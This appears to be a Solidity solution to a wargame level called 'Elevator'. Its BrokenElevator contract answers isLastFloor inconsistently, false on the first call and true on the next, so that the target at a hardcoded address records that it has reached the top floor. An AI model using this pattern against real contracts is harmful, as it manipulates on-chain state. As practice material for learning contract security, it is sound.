// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel11.sol";

contract BrokenElevator {

    Elevator level11 = Elevator(0x2A60b6D024Fc4A82E64c114Bbc43879623701379);
    bool public counter = false;
    
    function gotoFloor() public {
        level11.goTo(1);
    }
    
    function isLastFloor(uint _floor) public returns (bool) {
        if (!counter) {
            counter = true;
            return false;
        } else {
            counter = false;
            return true;
        }
    }
}